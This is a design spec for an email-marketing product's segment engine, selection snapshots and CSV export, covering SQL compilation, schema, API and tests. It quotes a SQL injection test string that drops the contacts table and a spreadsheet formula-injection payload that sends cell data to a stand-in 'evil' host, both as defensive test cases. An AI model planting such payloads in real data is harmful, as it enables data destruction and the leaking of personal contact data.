# M1b — Segment engine, selection snapshots and export

Milestone M1b of NM. Follows M1a (contact core and suppressions), which is merged.

**This supersedes `2026-11-12-m1b-segments-and-import.md`.** Both reviews are in
`2026-11-12-m1b-spec-review.md`; the first killed that draft's centrepiece with a measured
counterexample, the second cleared this one's replacement and found nine defects in it. Import
moves to its own milestone (§15): together they were 22–26 tasks against M1a's 17, and they share
nothing but `ContactFilter`.

This milestone answers the question `spec.md:512` left open — *"How segment rules compile into
SQL"* — and closes the issues M1a filed as blocking.

---

## 1. Scope

**In:** the segment rule AST and compiler; segment CRUD; a rule builder with counts; count
preview, exact or honestly labelled; segments as a target for the selection and bulk engine;
**materialised selection snapshots**, closing issue `04` (§8); streamed, audited,
injection-safe export (§10); the `remove` → `unsubscribe` rename, issue `08` (§11); issue `03`,
now cheap (§9.2); ADR 0004 superseding ADR 0003 (§8.8); one column written now that cannot be
backfilled later (§15.1).

**Out:** **import** — CSV, NDJSON, `batchUpsert`, staging, de-duplication, the wizard — which is
M1c, and §15 lists what it inherits; engagement rules, since no send path exists (§4.6); double
opt-in, preference center and consent log, which are M1d (renumbered by the split); the
`nm worker`; AI segment-from-a-sentence, which needs the AST stable first; and **attribute
indexing**, dropped for measured reasons in §6.

---

## 2. Decisions carried in

- `workspace_id` on every tenant table; composite foreign keys `(workspace_id, id)`. `authorize`
  returns 404 before it checks the role. §8.6 records the one deliberate exception this milestone
  adds.
- `contacts` has **no status column**; a workspace-wide opt-out is a `suppressions` row. ADR 0001.
- `mailable_list_members` is the **only** eligibility definition — four separate `NOT EXISTS`,
  never two with `OR`. §4.7 says why a segment is not folded into it.
- Every request body and signed payload carries `#[serde(deny_unknown_fields)]`. Three near-misses
  in M1a came from its absence.
- Emails are normalised by `users::normalize_email`. IDs are UUIDv7 minted in Rust.
- A changed payload meaning means a **bumped signing label**, so no outstanding token can skip a
  newly added check.

---

## 3. Domain model

A **segment** is a named, saved predicate over contacts in one workspace. It is **live**: it
stores rules, never a membership list.

A segment is not a list. A list is a thing a person joins, whose membership carries a status and
consent; a segment is a question asked of the data. Nothing is added to a segment and "remove
from segment" is not an operation.

---

## 4. How segment rules compile into SQL

### 4.1 The AST

```jsonc
{
  "match": "all",            // "all" | "any"
  "rules": [
    { "field": "email",     "op": "contains",  "value": "@acme.com" },
    { "field": "attr:plan", "op": "eq",        "value": "pro" },
    { "field": "list",      "op": "member_of", "value": "<uuid>", "status": "subscribed" },
    { "field": "tag",       "op": "not_has",   "value": "<uuid>" },
    { "group": { "match": "any", "rules": [ … ] } }
  ]
}
```

A node is **either** a rule **or** a group, never both. Both deny unknown fields.

**Limits at parse:** depth ≤ 3, ≤ 50 rules per segment, ≤ 20 per group. Exceeding any is `422`,
never truncation.

**An empty `rules` array is `422 empty-rules`, at every level.** Under `match: "all"` it is
vacuously TRUE, compiling to *every contact in the workspace* — and a rule builder produces one
every time someone deletes the last rule in a group. Third instance of the shape that twice
nearly emptied a workspace in M1a. Refused at parse, at save, and at preview.

### 4.2 Fields are a whitelist

| Field | Source |
|---|---|
| `email`, `first_name`, `last_name`, `timezone` | column on `contacts` |
| `email_domain` | the generated stored column |
| `created_at`, `updated_at` | column on `contacts` |
| `attr:<key>` | `contacts.attributes ->> <key>`, `<key>` naming a real definition |
| `list` | `list_memberships` |
| `tag` | `contact_tags` |
| `suppressed` | the `blocking()` predicate |

Anything else is `422 unknown-field`. An `attr:` key naming no definition is `422` — **not** an
always-false rule, for §4.1's reason. Archived definitions resolve for reading so existing
segments keep working; a new rule cannot name one.

**A `list` or `tag` value is resolved against the workspace at parse too, and one naming no row is
`422 invalid-value`.** The negations are why, and they are the same "matches everything" shape as
an empty rule set: `not_has` of a tag this workspace does not have compiles to a `NOT EXISTS` that
is true for *every* contact, so a saved "not tagged churned" would become "every contact" the
moment somebody deletes the `churned` tag. Of the four references a document can carry, the two
that degrade harmlessly were already refused and these two were not; now all four are. A stored
document whose list or tag has since been deleted is that row's `unreadable` (§5) and a `422` on
the paths that need the document itself — unusable until it is saved again, which is the safe
direction. Deleting a list or a tag stays unguarded: the predicate reports itself broken instead.

**A field resolves to a fixed SQL fragment chosen by a match on this table.** The compiler has no
branch that writes a caller-supplied identifier.

**An unresolvable `segment_id` is a `404` on every path that accepts one** — not a `422`. A
missing field name is a malformed document; a missing segment is a missing resource, and tenancy
requires 404 rather than anything that distinguishes "not yours" from "not there". Decided once
in `load_rules`, never per path. The paths are segment CRUD, the
contacts grid, bulk selection and export. A deleted or cross-workspace segment must not degrade
to "no rules".

### 4.3 Operators are typed by the definition

- **text:** `eq`, `neq`, `contains`, `not_contains`, `starts_with`, `ends_with`, `is_set`, `is_not_set`
- **number:** `eq`, `neq`, `gt`, `gte`, `lt`, `lte`, `is_set`, `is_not_set`
- **date / datetime:** `before`, `after`, `on`, `in_last_days`, `is_set`, `is_not_set`
- **boolean:** `is_true`, `is_false`, `is_set`, `is_not_set`
- **select:** `eq`, `neq`, `is_set`, `is_not_set`
- **multi_select:** `has_any`, `has_none`, `is_set`, `is_not_set`
- **list:** `member_of`, `not_member_of`, each with optional `status`
- **tag:** `has`, `not_has`
- **suppressed:** `is_true`, `is_false`

A `multi_select` stores a JSON array, so `->>` text comparison is meaningless on it: `has_any`
and `has_none` compile through `jsonb`'s `?|` (`jsonb_exists_any`) against the array's elements,
with `has_none` also matching an absent or NULL key. A multi_select that can only be tested for
presence is a field nobody can segment on, which defeats the point of having typed custom fields.

**Values on `contains`, `starts_with` and `ends_with` must have `%`, `_` and `\` escaped**, with
an explicit `ESCAPE` clause. Unescaped, a user searching for `50%` matches every row — the same
"matches everything" shape as an empty rule set, arriving through a value rather than a document.

An operator outside its kind's set is `422`. Casting follows the **definition's** kind —
`(attributes ->> $n)::numeric` — safe only because `validate_attributes` enforces the type on
write. That coupling is load-bearing and §15.2 carries it to the importer.

### 4.4 Values are bound, never formatted

Every value, **including every attribute key**, goes through `sqlx::QueryBuilder::push_bind`.
Postgres resolves a bound key in `attributes ->> $n`; `purge_custom_field`'s `attributes ? $2`
already relies on the same shape.

**Bind attribute keys as `&str`/`String`.** `->>` is overloaded on `text` and `integer`; another
inferred type selects the array-index overload and the rule silently means something else.

**Test obligation:** an attribute key of `plan'); drop table contacts; --` compiles, runs, matches
nothing, and `contacts` still exists — shown to fail if any value is interpolated.

### 4.5 Negation is `NOT EXISTS`, and must survive NULL

`not_has`, `not_member_of`, `not_contains` compile to `NOT EXISTS (…)`, never a negated join: a
contact with no tags must match "does not have tag X".

**The NULL half is a separate trap.** For a `contacts` column there is nothing to anti-join and
three-valued logic bites instead: `timezone not ilike '%x%'` is NULL — therefore not true — for
every contact whose timezone is NULL. Negative text operators compile to
`(col is null or col not ilike …)`.

Reviewer check: **a contact with zero related rows, or a NULL/absent value, matches every
negative operator.**

**That rule is about negations of positive operators** — `not_has`, `not_member_of`,
`not_contains`, `neq` — and not about `is_false`. `is_false` is one arm of a four-way partition
with `is_true`, `is_set` and `is_not_set`, so on a boolean **attribute** it means *stored false*,
and a contact with the key absent does **not** match. The reverse stays expressible as a group of
`any[is_false, is_not_set]`, whereas folding absence into `is_false` would make "stored false"
unaskable. `suppressed is_false` keeps meaning "no blocking suppression", which is not an
inconsistency: a boolean attribute is three-valued (true, false, absent) while `suppressed` is
computed and cannot be unset.

### 4.6 Engagement rules are reserved

`opened`, `clicked`, `bounced`, `sent` parse and return `422 not-yet-available`. Reserved so the
builder's shape does not change when sends land and no stored segment needs migrating.

### 4.7 A segment is a selection predicate, not an eligibility one

A segment may deliberately describe suppressed or unsubscribed contacts — "everyone who
unsubscribed in the last 30 days" is necessary. So the compiler never silently adds a suppression
filter; `suppressed` is an explicit field. M2 intersects with `mailable_list_members` at launch
and reports how many the intersection removed.

---

## 5. Counts: exact when cheap, honest when not

`spec.md:457` budgets p95 < 2 s at 10M and allows an estimate while typing.

`POST /segments/preview` returns `{ "count": n|null, "exact": true|false, "took_ms": n }`.

The count runs in a transaction with `SET LOCAL statement_timeout = '1500ms'`. On timeout the
handler opens a **fresh** transaction — the timed-out one is aborted and unusable — and reads the
planner's estimate from `EXPLAIN (FORMAT JSON)` of the **row-producing select**, from the **top**
node. (`EXPLAIN` of a `count(*)` reports `Plan Rows: 1` at every node, and a scan node's figure is
per-worker.)

**A rule set containing any `attr:` rule does not get an estimate.** §6 drops attribute indexing,
so Postgres has no statistics for `->>` and falls back to a default selectivity — measured 66×
low against a true count of 66,666. A planner number here would be worse than no number. Those
previews return `count: null, exact: false`, and the UI says **"too many to count exactly"**.
Returning a figure nobody should act on is the failure this whole milestone keeps finding.

Three correctness notes the review measured:

- **`SET LOCAL` outside a transaction is a `WARNING`, not an error**, leaving the timeout at `0` —
  so a preview that forgets to open a transaction has *no* timeout and hangs. §17's test must
  assert the preview actually timed out, or it passes vacuously in exactly that case.
- **`SET LOCAL` does not leak** across a pooled connection; it reverts on commit and rollback.
  Pinned by a normal query on the same pool afterwards.
- **`issued` is never an estimate.** §8 makes that structural: a snapshot's count is the number of
  rows it wrote.

---

## 6. No attribute indexing in M1b

The previous draft put a `jsonb_path_ops` GIN index on `contacts.attributes`; the first review
showed it serves nothing, because the compiler emits `->>` and no GIN opclass serves `->>`. The
replacement — one btree expression index per custom field definition — was measured too, and it
is not shippable:

- A **partial** index (`where workspace_id = '<const>'`) is **not used** under
  `force_generic_plan`, which is what sqlx gets once a prepared statement has been reused six
  times on a connection. It fails in the worst possible shape: fast in testing, sequential scan in
  production, nothing changed.
- One index per definition is one index per *tenant's* definition on a **shared** table. Fifty
  workspaces with twenty fields is **1,000 indexes on `contacts`**, each maintained on every
  contact write — worse write amplification than the GIN it replaces, and worse again under
  M1c's 1M-row import.
- `CREATE INDEX` takes a `SHARE` lock on `contacts`: minutes of blocked writes at 10M rows,
  triggered by an admin adding a field. `CONCURRENTLY` **cannot run inside a transaction block**,
  so it cannot live in the handler at all, and it can leave an `INVALID` index behind.

**So M1b ships no attribute index.** Nothing runs at 10M yet, `is_set` already has no index and
§19 accepts that, and dropping it removes a DDL-on-CRUD subsystem, a lock hazard and a detached
task from a milestone that does not need them. §5 is honest about the consequence rather than
papering over it with a planner number.

§19 records what to do when it is needed: composite shape, never partial; `CONCURRENTLY` from a
detached task; created **on demand** when a segment first filters a key, not when a field is
defined; a per-workspace cap; and a sweep for `INVALID` indexes.

---

## 7. Schema

```sql
-- 0016_segments.sql
create table segments (
  id uuid primary key,
  workspace_id uuid not null references workspaces(id) on delete cascade,
  name text not null,
  description text not null default '',
  rules jsonb not null,
  version integer not null default 1,
  created_by uuid references users(id) on delete set null,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now(),
  unique (workspace_id, name),
  unique (workspace_id, id)
);
create index segments_keyset on segments (workspace_id, id desc);

-- 0017_selection_snapshots.sql
create table selection_snapshots (
  id uuid primary key,                -- UUIDv7: carries its own issue time, see §8.5
  workspace_id uuid not null references workspaces(id) on delete cascade,
  created_by uuid references users(id) on delete set null,
  filter jsonb not null,              -- the predicate as sent; redaction is the audit copy's, §8.7
  size bigint not null,
  created_at timestamptz not null default now(),
  expires_at timestamptz not null,
  unique (workspace_id, id)
);
create index selection_snapshots_expiry on selection_snapshots (expires_at);
create index selection_snapshots_actor on selection_snapshots (workspace_id, created_by);

create unlogged table selection_snapshot_members (
  workspace_id uuid not null,
  snapshot_id uuid not null,
  contact_id uuid not null,
  primary key (workspace_id, snapshot_id, contact_id),
  foreign key (workspace_id, snapshot_id)
    references selection_snapshots (workspace_id, id) on delete cascade
);

-- 0018_membership_provenance.sql
alter table list_memberships add column source text
  check (source in ('ui','api','import','form','bulk'));
```

Notes that are not obvious from the DDL:

- **`selection_snapshot_members` is `unlogged`.** It is ephemeral, hourly and recreatable. Logged,
  it would push ~158 MB per 1M-row selection through WAL and into every base backup. A crash
  truncates it, which produces the same "your selection expired, select again" path the TTL
  already produces.
- **`source` is nullable with no default.** A `not null default 'api'` would backfill every
  existing row — every UI and `bulk/subscribe` membership — with a provenance that is simply
  false, destroying in the creating migration the distinction §15.1 argues cannot be
  reconstructed. Existing rows get NULL, meaning "written before provenance was recorded", which
  is true.
- The `check` constraint matches the house style of `lists.visibility`,
  `list_memberships.status` and `suppressions.reason`.
- **There is no `list_memberships.updated_at`.** The previous draft added one, justified by "a
  status change leaves no timestamp at all". That was factually wrong: `subscribed_at` and
  `unsubscribed_at` both exist in migration 0012 and both are maintained. A redundant column with
  no owner backfills to `created_at` and never moves again.

---

## 8. Issue `04` is closed by materialising the selection

### 8.1 Why the timestamp design was abandoned

The previous draft bounded every joined fact by the token's timestamp and claimed the resolved
set would always be a subset of what the user saw. It was broken twice, with measurements:

1. **Negation inverts it.** `not_has(tag)` compiles to `NOT EXISTS (… created_at <= t)`. A contact
   that *had* the tag at `t` was correctly not shown. Delete the tag, and the bounded `NOT EXISTS`
   becomes true — the contact is acted on, having never been shown. A **superset** violation. The
   same inversion reaches `not_member_of` through the `updated_at` maintenance the design itself
   mandated: an unsubscribe hides a membership that existed at `t`, pulling someone who *was* on
   the list into a "not on the list" action. On an email product that is the re-solicitation
   predicate.
2. **A timestamp is not a commit order.** `now()` is transaction-start time, so a transaction that
   starts, writes, and commits two minutes later produces rows stamped *before* a token issued in
   between — rows the token could not see, which pass `created_at <= as_of_time`. Issue `04` was
   filed as blocking *for the importer*, and the importer is exactly a long transaction.

No bound fixes this: subset-correctness for `¬P` needs proof the fact was **absent** at `t`, and
deletion destroys the evidence of presence.

### 8.2 The design

`POST /contacts/selection` **materialises** the matching contact ids:

```sql
insert into selection_snapshot_members (workspace_id, snapshot_id, contact_id)
select $1, $2, id from contacts where … <compiled predicate> … limit 1000001
```

The token carries `{workspace_id, snapshot_id, issued}` and nothing about the predicate.

**The snapshot narrows `contacts`; it never supplies ids.** A bulk action reads

```sql
select id from contacts
 where workspace_id = $1
   and id in (select contact_id from selection_snapshot_members
               where workspace_id = $1 and snapshot_id = $2)
```

Reading ids *out of* the members table and inserting them elsewhere would hit a foreign-key
violation the moment a single contact had been deleted since selection, killing the whole action.
Narrowing degrades correctly: the deleted contact is simply absent.

Consequences:

- **No widening is possible.** The predicate is never re-evaluated.
- **No swap is possible.** Identity is recorded, not inferred.
- **The count is exact for free** — it is the insert's `rows_affected`, which is `issued`.
- A contact deleted between selection and action is absent; the action affects fewer and the
  existing `affected` / `selected` gap reports it.
- A contact that changed so it no longer matches **is still acted on.** That is correct: the
  person confirmed *these contacts*, not *this query*.

### 8.3 A contact who unsubscribes between selection and action

They are still in the frozen set, so `bulk/subscribe` runs against them. This is safe, but only
because `selection::subscribe` is `on conflict do nothing` and eligibility is re-checked at send.

**Freezing is safe because subscribe is non-destructive.** Write that dependency down at the call
site: `lists::add_member` is already `do update … where status = 'unsubscribed'`, and anyone who
later aligns `selection::subscribe` to it turns freezing into a re-subscription bug with no
warning. §15.3 carries the same question to the importer.

### 8.4 The cost, stated honestly

Measured on a 1M-row table, floor case, no predicate beyond `workspace_id`:

| | |
|---|---|
| `insert … select` of 1,000,000 ids | **4,887 ms** |
| `pg_total_relation_size` of the members rows | **158 MB** |
| `delete … where snapshot_id = $1` | **850 ms** |

So one selection can cost five seconds and hold 158 MB for an hour. That exceeds
`spec.md:457`'s 150 ms server-time budget by two orders of magnitude and §16 records it as a
deviation rather than leaving it silent.

Four consequences, each of which is a requirement:

- **The cap is 1,000,000**, applied as `limit 1000001` in the insert. If the extra row arrives,
  the transaction rolls back and the response is `422 selection-too-large` saying *more than
  1,000,000* — it does not name an exact count, because naming one needs a counting pass that
  doubles the work and races with the insert.
- **`POST /contacts/selection` is rate-limited** at least as hard as preview. It is the most
  expensive endpoint in the product and the previous draft rate-limited the 1.5-second one and
  left this one open.
- **A new selection supersedes the actor's previous live one** in the same workspace. The UI has
  one active selection at a time, so the old snapshot is dead weight; deleting it on create bounds
  a single user's footprint to one snapshot.
- **The insert runs in a detached task if it is slow**, for the reason §15.3 records for the
  importer: a handler future is dropped on client disconnect.

### 8.5 The TTL must be enforced in the token, not only in the sweep

The previous draft's payload was `{workspace_id, snapshot_id, issued}` — no timestamp — so M1a's
TTL check, which derives age from `as_of.get_timestamp()`, could not be written at all. What was
left was `expires_at` plus a sweep that may not run for days. **A Friday token would act on
Monday.** Two measures, both required:

- **`snapshot_id` is `Uuid::now_v7()`**, so the issue time comes back for free, `parse` is
  unchanged from M1a, and the age check still happens before the database is touched.
- **The action's `sel` CTE joins `selection_snapshots` with `and expires_at > now()`**, so expiry
  does not depend on the reaper having run.

Test: an expired-but-unswept snapshot is refused.

### 8.6 Two deliberate exceptions, written down

- **`selection_snapshot_members` has no composite foreign key to `contacts`.** It is the first
  tenant table holding a `contact_id` without one, against M1a's "unrepresentable, not merely
  unwritten". The FK is omitted on purpose: its cascade needs an index on
  `(workspace_id, contact_id)` that the primary key cannot serve, so `bulk/delete` of 1M contacts
  would do 1M index scans. A dangling `contact_id` is harmless **because UUIDv7 is never reused**
  — that clause is load-bearing, and §8.2's narrowing read is what makes a dangling row a no-op.
- **M1a's `refuse_if_widened` is kept and must never fire.** §8.9 fixes its arithmetic first.

### 8.7 The audit row keeps the predicate

The token carries no predicate, so a bulk audit row would hold only a `snapshot_id` that is
deleted an hour later: *"deleted 417,004 contacts, snapshot 0192…"* with no way ever to learn who
or what rule — worse than M1a had, on the action that cannot be undone.

`selection_snapshots.filter` stores the predicate and the bulk handler copies it into the audit
row, with `q` **redacted**, per M1a's rule that audit metadata outlives a GDPR erasure.

### 8.8 ADR 0004 supersedes ADR 0003

ADR 0003 is now wrong end to end: the predicate has left the token, the widening check is not the
guarantee, and the alternative it explicitly rejected is what this milestone builds. It is
**superseded, not edited** — the same reasoning §11 applies to old audit strings. ADR 0004 carries
the new design, the two measured counterexamples that killed the timestamp variant, and the cost
table in §8.4. The long doc comments on `Selection` and `Selection::widened` carry the superseded
argument and must be rewritten with it.

### 8.9 The signing label bumps to `v3`, and the widening arithmetic changes

The payload's meaning changes, so `nm:selection:v2` → `v3`, with no `serde(default)` on any field:
an outstanding v2 token fails the HMAC rather than deserialising into something this build would
misread.

M1a's guard is `selected + excluded.len() > issued`. Under §8, `issued = |S|` and
`selected = |S| − |E ∩ S|`, so `selected + |E| > issued` **whenever an excluded id is not in the
snapshot** — a spurious `409 selection-widened` on a set that cannot widen. Snapshots make that
*more* likely, not less: the grid shows the live filter with `refetchOnWindowFocus` on, so it
diverges from the frozen set by every contact created, edited, tagged or subscribed since
selection. Untick one of those — the most ordinary action on that screen — and the action refuses.

The exclusion term is meaningless once `issued = |S|`. **The guard becomes `selected > issued`**,
which is then genuinely unreachable, and §8.6's "must never fire" becomes true as written. A
tripwire that fires in normal operation gets deleted by whoever is on call.

`Selection::of_ids` is unchanged and carries no `snapshot_id`: an explicit id list is already a
frozen set. `MAX_EXCLUDED` stays at 10,000, which against a 1M snapshot is newly reachable and is
a plain `422`.

### 8.10 The reaper is its own bounded sweep

The previous draft rode M0's session sweep. That sweep is `delete from sessions where expires_at
<= now()`, inline in a user's request, once a minute, best-effort — appropriate for a 200-byte
row and not for a 158 MB one. It only runs while somebody is logged in, so Friday's snapshots
survive to Monday, and the measured 850 ms cascade would land on the hot path of a stranger's
authenticated request.

Instead: a bounded sweep that deletes **one** expired snapshot per pass. As built,
`sweep_expired_snapshots` is its own task, so the worst case a request pays is **nothing at all** —
this section's "one cascade" was written against a draft that still rode a request. §19 records partitioning by expiry hour and dropping the partition
as the upgrade if churn measures badly.

---

## 9. Consent, tagging, and issue `03`

### 9.1 `bulk/tag` stays on the reporting side

ADR 0003 required this be decided with the segment work: *"the moment M1b lets a campaign target
a tag or a segment expression, tagging manufactures consent."*

Under §8 no bulk action can reach a contact outside its snapshot, so the consent-creating
distinction — which was about *which contacts* — is answered for every action kind structurally,
not circumstantially. `delete` and `subscribe` keep their refusals anyway, as §8.6 keeps the
widening check: they cost nothing and they are the last line if the snapshot join is ever
bypassed.

**What snapshots do not answer is what the operator understood they were agreeing to.** Once M2
targets a tag, "Tag 5,000 contacts" makes 5,000 people mailable and the button does not say so.
That is confirmation copy, not a refusal: §14 carries it.

### 9.2 Issue `03` closes here

Issue `03` — the confirmed count never reaches the server — has been open since M1a because
fixing it meant a design change. Snapshots make it a comparison: the client sends the size it
displayed, and the server rejects the action if it disagrees.

**It is compared against `counts.selected`, not against `selection_snapshots.size`** — the
snapshot's size is the set as issued, while the action is bounded by the set *minus this
selection's exclusions*, which is what the person was actually shown. Comparing against `size`
is the check Task 6's review ruled out, and this sentence described it for longer than the code
did. Cheap now, so it is done now.

The residual is honest and worth stating here rather than leaving for someone to find: the server
is bounding by a number **the client supplies**. That catches the realistic failure — a stale
screen, a concurrent edit — and it is what ADR 0004 specifies. A client that lies about its own
confirmed count is undefended, and undefendable at this layer; what bounds *that* is the snapshot
itself, through `issued`.

---

## 10. Export

- `POST /contacts/export` takes the same `ContactFilter` the grid uses, including `segment_id`,
  and streams CSV. It never buffers; a 10M-row export must not hold memory proportional to the
  result.
- Columns: the contact's own fields, every live custom field, `lists` and `tags` as
  semicolon-joined names, and `suppressed`.
- **CSV formula injection is neutralised.** Any cell whose first character is `=`, `+`, `-`, `@`,
  tab or CR is prefixed with a single quote, **unless the whole cell parses as a finite number**.
  Without it, a `first_name` of `=HYPERLINK("http://evil/?x="&A1,"click")` — settable through any
  signup form — executes when an admin opens the export of the whole contact list. Pinned by a
  test.

  The numeric exception exists because `-5` is a number, not a formula, and prefixing it exports
  a number field as the text `'-5`, which the M1c importer would read back wrong. `-5-5` does not
  parse as a number and is still prefixed, so nothing that Excel would evaluate escapes. Data
  fidelity and injection safety do not actually conflict here; treating them as if they did
  corrupts every negative number in the file.

- **The `lists` column carries each membership's status**, as `name:status` pairs, not bare names.
  A membership without its status is not the data: an export listing an `unsubscribed` member
  indistinguishably from a `subscribed` one is a re-subscription waiting for M1c's importer to
  read it back. `tags` stay bare names, having no status.
- **Audited**: actor, filter, row count; `q` is not recorded, for §8.7's reason.
- `Role::Admin`. Stated honestly: this does not prevent exfiltration — an editor can already page
  the book out 100 rows at a time — it raises the cost and creates one audit point where there was
  none. It will not block legitimate work.

---

## 11. Issue `08`: `remove` becomes `unsubscribe`

The route sets a membership to `unsubscribed` and keeps the row, while everything about it is
named `remove`. Renamed before any external client exists:

- `DELETE /lists/{id}/members/{contact_id}` → `POST /lists/{list_id}/members/{contact_id}/unsubscribe`
- `DELETE /contacts/{id}/lists/{list_id}` → `POST /contacts/{contact_id}/lists/{list_id}/unsubscribe`
- `remove_list_member` → `unsubscribe_list_member`; `remove_member` → `unsubscribe_member`;
  `remove_contact_from_list` → `unsubscribe_contact_from_list`
- audit action `LIST_MEMBER_REMOVED` → `LIST_MEMBER_UNSUBSCRIBED`

**Both routes, not one.** The contact-side route does the same thing under the same wrong name,
issue `08`'s own table lists it first, and it is the one the UI actually calls. Renaming half of a
pair leaves two routes performing one operation under two names and two verbs, which is worse
than either state — the same argument that closed M1a's two drifted axe helpers.

**Existing audit rows keep the old string.** Rewriting history makes the audit log a worse record
than it was. The glossary carries both, noting which superseded which.

---

## 12. API

```
GET    /api/v1/workspaces/{ws}/segments                 list, cursor-paginated
POST   /api/v1/workspaces/{ws}/segments                 create
GET    /api/v1/workspaces/{ws}/segments/{id}            read
PATCH  /api/v1/workspaces/{ws}/segments/{id}            merge patch
DELETE /api/v1/workspaces/{ws}/segments/{id}            delete
POST   /api/v1/workspaces/{ws}/segments/preview         count an unsaved rule document
GET    /api/v1/workspaces/{ws}/contacts?snapshot_id=…   the frozen set, see §14
POST   /api/v1/workspaces/{ws}/contacts/export          streamed CSV
```

Conventions are M0's and M1a's: RFC 9457 problems, cursor pagination as `{data, next_cursor}`,
`deny_unknown_fields` everywhere, unique `operationId` per handler, 404 before 403.

- **`rules` is replaced wholesale, not merge-patched.** RFC 7386 merges recursively, so
  `{"rules": {"match": "any"}}` would flip the connective and silently keep the old array. A
  `PATCH` carrying `rules` must carry the entire document; a partial one is `422`.
- **The version bump is `rules is distinct from $new::jsonb`**, not a text comparison — `jsonb`
  reorders keys, so a text compare bumps on a no-op save.
- **`preview` and `contacts/selection` are both rate-limited per workspace**, with `RateLimit`
  headers as `spec.md` specifies. Preview accepts an arbitrary rule document at `viewer` and is
  called on a debounce; selection costs five seconds and 158 MB. Nothing outside login is
  rate-limited today and these two cannot be the first exceptions.
- **Idempotency keys are owed, not implemented.** `unique (workspace_id, name)` makes a retried
  create a `409`, and a retried selection is merely wasteful now that §8.4 supersedes the
  previous snapshot. The endpoint that needs a key is the importer's; **M1c's scope carries it as
  a task**, not as a memory.

---

## 13. Permissions

| Operation | Role |
|---|---|
| Read segments, preview a count | viewer |
| Create, edit, delete a segment | editor |
| Export contacts | **admin** |
| Everything inherited from M1a | unchanged |

---

## 14. UI

- **Segments list** — name, description, a live count loaded per row without blocking the list.
  The empty state says what a segment is in one sentence.
- **Rule builder** — groups with all/any; the field picker driven by live definitions, the
  operator picker by the field's kind, the value control by the kind. The count updates on a
  debounce and never blocks typing. **Deleting the last rule in a group removes the group**,
  rather than leaving an empty one that §4.1 refuses.
- **Counts** — exact plain; `~12,400` where an estimate is honest; **"too many to count exactly"**
  where §5 says no estimate is.
- **"Here is what you selected."** Once a selection exists the grid can show the frozen set via
  `?snapshot_id=…`, because identity is now recorded. This is not cosmetic: it removes the
  divergence between the live grid and the snapshot that §8.9 had to fix arithmetically, and it
  retires both of ADR 0003's over-refusal paths at the source.
- **"Select all matching" is never offered from an estimate.** With no exact count the click costs
  five seconds and may end in `422 selection-too-large`.
- **Bulk-tag confirmation says what tagging will mean** once a campaign can target a tag — §9.1.
- **Export** — a confirmation naming the row count and that the file contains personal data;
  admin-only, with the control absent rather than disabled for everyone else.
- Every new screen and dialog goes through `worst-case-data.spec.ts` with long values, and is
  axe-clean in both themes at 320 px and 200 % zoom. New dialogs join the `opens()` list.
- Route chunks stay under the per-chunk ceiling; the shell stays under 150 KB gzipped.

---

## 15. What M1c (import) inherits

### 15.1 Consent provenance is written now

`list_memberships.source` lands in this milestone even though the importer does not exist,
because `bulk/subscribe` already writes memberships and M1d's consent log must explain every one
of them. A million memberships written with nothing but `subscribed_at` can never be explained
afterwards. Deferring the consent *feature* is fine; writing the rows without provenance is not.

### 15.2 The importer must not become a second, weaker write path

`src/contacts/mod.rs` already warns that a bulk `INSERT` elsewhere silently bypasses the erasure
guard. M1c must carry the suppression HMAC per row and anti-join it; mint ids with
`Uuid::now_v7()` in Rust; set `updated_at` on updated rows; and **not** reimplement
`validate_attributes` in SQL — §4.3's cast safety depends on that function holding, so a weaker
SQL copy breaks the segment compiler, not merely the import.

### 15.3 Decisions M1c must make, listed so they are not discovered

- **Double opt-in.** `lists::add_member` writes `pending` on a `double_optin` list. An import
  writing `subscribed` manufactures a confirmation nobody gave.
- **Resurrection.** `lists::add_member` revives an unsubscribed membership;
  `selection::subscribe` does `do nothing`. These disagree. M1c must say which the importer
  follows — and §8.3 explains why `selection::subscribe` must not be quietly aligned to the other.
- **Merge does not exist, and §8 depends on that.** Email cannot be edited and a contact cannot be
  replaced, which is the only reason a frozen snapshot stays meaningful. An importer may **update**
  a contact, never replace one; if a merge feature ever lands it must remap snapshot members or
  invalidate live snapshots.
- `ON CONFLICT DO UPDATE` **errors** on a duplicate key within one command
  (`21000: cannot affect row a second time`). In-file de-duplication via `distinct on` is a hard
  precondition: one duplicate address aborts a 1M-row import.
- A handler future is **dropped on client disconnect**, so an import needs a detached task, `202`
  and polling.
- A session-level advisory lock **survives on a pooled connection** (`src/db.rs` sets no
  `after_release`, sqlx issues no `DISCARD ALL`), so a workspace would never import again until
  restart. Use `pg_advisory_xact_lock`.
- Retention and GDPR reach for any stored raw CSV cell, which is personal data by construction.
- Idempotency keys, per §12.

---

## 16. Deviations from `spec.md`, recorded

1. **Import is not in this milestone** (`spec.md:107` groups it with segments). Scope; §1.
2. **Engagement rules return 422** (`spec.md:106` implies a complete builder). No events until M2.
3. **Export is admin-only.** `spec.md` does not say; §10 gives the reason and its honest limits.
4. **A bulk selection is capped at 1,000,000 contacts.** §8.4.
5. **`POST /contacts/selection` cannot meet the 150 ms budget** (`spec.md:457`). It is measured at
   ~4.9 s for 1M rows. Defensible — it is an explicit, rate-limited, once-per-task act — but it is
   the one endpoint in M1b that misses a stated budget, and it should not be silent.

---

## 17. Testing

- **Injection.** An attribute key of `plan'); drop table contacts; --` matches nothing and
  `contacts` survives; shown to fail if any value is interpolated.
- **Empty rules** refused at parse, save and preview, plus a structural test that compiled SQL
  always carries a restriction beyond `workspace_id`.
- **An unknown field is 422 and an unresolvable `segment_id` is 404,** on every path that accepts one —
  including the grid and export, not only segment CRUD.
- **Negation over absence and NULL.** For every negative operator: zero related rows matches, and
  a NULL column value matches.
- **`SET LOCAL` correctness.** A timed-out preview is followed by a normal query on the same pool
  that is not subject to the short timeout — **and the test asserts the preview actually timed
  out**, or it passes vacuously when the timeout was never set.
- **No estimate for attribute rules:** such a preview returns `count: null`, never a planner
  number.
- **The snapshot is frozen.** A tag applied after selection does not bring its contact in; a tag
  removed after it does not take one out; `not_has` and `not_member_of` are tested in **both**
  directions, because that inversion is what killed the previous design.
- **The action narrows `contacts` rather than reading ids out of the snapshot:** deleting a
  selected contact before the action leaves the action working and the count short.
- **The TTL is enforced from the token**: an expired-but-unswept snapshot is refused.
- **`refuse_if_widened` never fires** on a normal action, including one with exclusions that are
  not in the snapshot — the case that fired under the old arithmetic.
- **The audit row carries the predicate** and no `q`, and survives the snapshot's deletion.
- **The cap** refuses above 1,000,000 without claiming an exact count.
- **A new selection supersedes the actor's previous one.**
- **A v2 token is refused** after the label bump.
- **Export** streams without memory growth, prefixes formula-leading cells, writes an audit row
  carrying no `q`, and is refused for an editor.
